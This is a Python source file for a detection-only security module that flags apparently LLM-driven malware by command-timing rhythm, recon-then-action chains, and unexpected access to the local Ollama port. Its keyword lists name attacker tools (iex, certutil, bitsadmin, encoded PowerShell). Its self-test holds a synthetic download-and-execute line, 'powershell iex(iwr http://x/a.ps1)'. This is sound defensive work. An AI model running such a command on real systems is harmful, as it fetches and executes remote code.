"""counter_agentic.py — Counter-Agentic Detection (Code: CAGT).

Purpose
    A cognitive-layer DETECTION module aimed at autonomous, agentic malware —
    the kind driven by an LLM reasoning loop rather than a fixed script. Instead
    of matching static hashes or IPs, CAGT looks for the *behavioural signature*
    of an agent thinking: a recurring inference-latency rhythm between spawned
    commands, combined with a discovery→action reasoning chain, plus anomalous
    access to the local model-inference port.

SCOPE — DEFENSIVE DETECTION ONLY
    This module is deliberately limited to detection and alerting. It does NOT
    contain — and will not — any offensive/active-response capability. The
    original specification's weaponized subsystems (semantic tar-pits / prompt-
    injection payload generation, Economic-Denial-of-Sustainability recursive-
    junk endpoints, adversarial Unicode/output corruption, and active WFP
    severing) are intentionally EXCLUDED: they are offensive tooling and out of
    scope for this project. CAGT raises high-severity events; mitigation
    decisions are left to the operator-gated SOAR layer.

Signals
    1. Inference-cadence fingerprinting — successive child-process spawns from
       one parent separated by the characteristic ~1.5–4.0 s LLM "thinking"
       pause, repeated.
    2. Discovery→action chain — the first command in that rhythm is
       reconnaissance (whoami/net/get-process…) and a later one is an action
       (iex/download/schtasks/reg…).
    3. Ollama port watch — connections to the local inference port
       (127.0.0.1:11434) from a process not on the expected allowlist.

Inputs
    Consumes process-creation events already on the EventBus (from ETWG / ETWR /
    Process Monitor) via the ``recent()`` polling pattern; also samples local
    connections via psutil. Read-only.

Drop-in contract: BaseModule subclass + CODE/NAME/state/health_pct/self_test +
module-level register().
"""
from __future__ import annotations

import os
import threading
import time

try:
    import psutil
except Exception:  # pragma: no cover
    psutil = None

from angerona.core.module_base import BaseModule, Severity

# The inference-pause window that characterizes an agentic thinking loop.
_MIN_PAUSE, _MAX_PAUSE = 1.5, 4.0
_STALE_AFTER = 60.0          # evict a parent's timeline after this idle gap

_DISCOVERY_KW = ("whoami", "net ", "net.exe", "systeminfo", "sysinfo",
                 "get-process", "get-childitem", "tasklist", "ipconfig",
                 "dir ", " ls ", "arp ", "quser", "wmic")
_ACTION_KW = ("download", "invoke-expression", "iex", "invoke-webrequest",
              "iwr", "schtasks", "reg add", "reg.exe add", "new-service",
              "bitsadmin", "certutil", "-enc", "frombase64string")

# Processes legitimately expected to talk to the local Ollama inference port.
_OLLAMA_PORT = 11434
_OLLAMA_ALLOW = {"ollama", "ollama.exe", "python", "python.exe", "python3",
                 "pythonw.exe", "angerona", "angerona.exe"}


class CounterAgenticModule(BaseModule):
    CODE = "CAGT"
    NAME = "Counter-Agentic Detection"
    name = "Counter-Agentic Detection"
    description = ("Detects autonomous/agentic malware by its inference-cadence "
                   "rhythm, discovery→action chains, and anomalous inference-port "
                   "access. Detection-only; no active/offensive response.")
    category = "Detection"
    version = "1.0.0"

    _POLL = 2.5      # governed cadence (Adaptive Resource Governor scales this)

    def __init__(self) -> None:
        super().__init__()
        self.state_lock = threading.Lock()
        # parent_pid -> list[(ts, cmdline)]
        self.timelines: dict[int, list[tuple[float, str]]] = {}
        self._last_ts = 0.0
        self._alerted: dict[int, float] = {}     # parent_pid -> last alert ts (dedup)
        self._detections = 0

    @property
    def state(self) -> str:
        return self.status

    @property
    def health_pct(self) -> int:
        return self.health

    # ── bus consumption ──────────────────────────────────────────────────────
    @staticmethod
    def _is_proc_event(ev) -> bool:
        details = getattr(ev, "details", {}) or {}
        if details.get("event_type") == "process_creation":
            return True
        return getattr(ev, "module", "") in (
            "ETW Real-Time Process Sensor", "ETW Core Listener",
            "Process Monitor", "PROC", "ETWG", "ETWR")

    def _ingest_bus(self) -> None:
        if self._bus is None:
            return
        for ev in self._bus.recent(100):
            if ev.ts <= self._last_ts:
                continue
            self._last_ts = max(self._last_ts, ev.ts)
            if not self._is_proc_event(ev):
                continue
            d = getattr(ev, "details", {}) or {}
            # Key the rhythm by the PARENT: an agent parent spawns a cadence of
            # child commands. Fall back to child pid if no ppid is present.
            parent = d.get("ppid") or d.get("pid")
            cmd = d.get("cmdline") or d.get("command_line") or d.get("name") or ""
            if parent is None or not cmd:
                continue
            try:
                parent = int(parent)
            except (TypeError, ValueError):
                continue
            self._record(parent, str(cmd), ev.ts)

    def _record(self, parent_pid: int, cmdline: str, ts: float) -> None:
        tl = self.timelines.setdefault(parent_pid, [])
        tl.append((ts, cmdline))
        if len(tl) > 12:
            del tl[:-12]                     # keep the recent window bounded
        self._analyze_rhythm(parent_pid, tl)

    # ── signal 1+2: cadence + discovery→action chain ─────────────────────────
    def _analyze_rhythm(self, parent_pid: int, timeline: list[tuple[float, str]]) -> None:
        if len(timeline) < 3:
            return
        d1 = timeline[-2][0] - timeline[-3][0]
        d2 = timeline[-1][0] - timeline[-2][0]
        if not (_MIN_PAUSE <= d1 <= _MAX_PAUSE and _MIN_PAUSE <= d2 <= _MAX_PAUSE):
            return
        if not self._is_contextual_chain(timeline[-3][1], timeline[-2][1], timeline[-1][1]):
            return
        # Dedup: at most one alert per parent per stale window.
        now = time.time()
        if now - self._alerted.get(parent_pid, 0.0) < _STALE_AFTER:
            return
        self._alerted[parent_pid] = now
        self._detections += 1
        self.emit(
            f"Agentic loop fingerprint on parent PID {parent_pid}: inference-cadence "
            f"rhythm ({d1:.1f}s, {d2:.1f}s) with a discovery→action command chain. "
            f"Possible autonomous/LLM-driven activity — review (detection only).",
            Severity.HIGH,
            parent_pid=parent_pid, delta1=round(d1, 2), delta2=round(d2, 2),
            chain=[timeline[-3][1][:120], timeline[-2][1][:120], timeline[-1][1][:120]],
            mitre="T1059 / T1082",
        )

    @staticmethod
    def _is_contextual_chain(cmd1: str, cmd2: str, cmd3: str) -> bool:
        """Discovery-then-action reasoning chain: first command is recon, a later
        command is an action."""
        c1 = cmd1.lower()
        later = (cmd2 + " " + cmd3).lower()
        return (any(k in c1 for k in _DISCOVERY_KW)
                and any(k in later for k in _ACTION_KW))

    # ── signal 3: local inference-port watch ─────────────────────────────────
    def _watch_ollama_port(self) -> None:
        if psutil is None:
            return
        try:
            conns = psutil.net_connections(kind="inet")
        except Exception:
            return
        for c in conns:
            laddr = getattr(c, "laddr", None)
            raddr = getattr(c, "raddr", None)
            port_hit = ((laddr and getattr(laddr, "port", None) == _OLLAMA_PORT) or
                        (raddr and getattr(raddr, "port", None) == _OLLAMA_PORT))
            if not port_hit or not c.pid:
                continue
            try:
                pname = psutil.Process(c.pid).name().lower()
            except Exception:
                continue
            if pname not in _OLLAMA_ALLOW:
                key = c.pid
                now = time.time()
                if now - self._alerted.get(-key, 0.0) < _STALE_AFTER:
                    continue
                self._alerted[-key] = now
                self.emit(
                    f"Unexpected process '{pname}' (PID {c.pid}) connected to the local "
                    f"inference port {_OLLAMA_PORT}. Possible attempt to hijack/abuse the "
                    f"local LLM. Review (detection only).",
                    Severity.HIGH, pid=c.pid, process=pname, port=_OLLAMA_PORT,
                    mitre="T1071 (Application Layer Protocol) / T1059")

    # ── housekeeping ─────────────────────────────────────────────────────────
    def _prune(self) -> None:
        now = time.time()
        stale = [pid for pid, tl in self.timelines.items()
                 if tl and (now - tl[-1][0]) > _STALE_AFTER]
        for pid in stale:
            del self.timelines[pid]
        for key, ts in list(self._alerted.items()):
            if now - ts > 4 * _STALE_AFTER:
                del self._alerted[key]

    # ── lifecycle ────────────────────────────────────────────────────────────
    def run(self) -> None:
        self.emit("CAGT online — counter-agentic detection (cadence fingerprinting + "
                  "inference-port watch). Detection-only.", Severity.INFO)
        while not self.stopping:
            try:
                self._ingest_bus()
                self._watch_ollama_port()
                self._prune()
                self.set_health(100, f"{len(self.timelines)} tracked lineages, "
                                     f"{self._detections} agentic detections")
            except Exception as exc:
                self.last_error = str(exc)
                self.set_health(60, f"analysis error: {exc}")
            self.sleep(self._POLL)

    def self_test(self) -> tuple[bool, str]:
        """Offline: a synthetic recon→pause→action cadence must fire; a benign
        fast/no-chain sequence must not."""
        t0 = 1000.0
        agentic = [(t0, "whoami /all"), (t0 + 2.2, "get-process"),
                   (t0 + 4.4, "powershell iex(iwr http://x/a.ps1)")]
        benign = [(t0, "explorer.exe"), (t0 + 0.1, "notepad.exe"),
                  (t0 + 0.2, "calc.exe")]

        # Drive detection through a throwaway instance with a capture bus.
        fired = {"n": 0}

        class _Bus:
            def publish(self, ev):
                if getattr(ev, "severity", 0) >= Severity.HIGH:
                    fired["n"] += 1

        probe = CounterAgenticModule()
        probe.bind(_Bus())
        for ts, cmd in agentic:
            probe._record(1234, cmd, ts)
        agentic_fired = fired["n"] >= 1

        fired["n"] = 0
        probe2 = CounterAgenticModule()
        probe2.bind(_Bus())
        for ts, cmd in benign:
            probe2._record(5678, cmd, ts)
        benign_quiet = fired["n"] == 0

        chain_ok = (self._is_contextual_chain("whoami", "x", "iex(iwr ...)")
                    and not self._is_contextual_chain("notepad", "calc", "explorer"))
        ok = agentic_fired and benign_quiet and chain_ok
        return ok, ("cadence+chain detection verified (agentic fires, benign quiet, "
                    "offensive subsystems excluded)" if ok
                    else f"detection logic failed: agentic={agentic_fired} "
                         f"benign_quiet={benign_quiet} chain_ok={chain_ok}")


def register() -> CounterAgenticModule:
    return CounterAgenticModule()
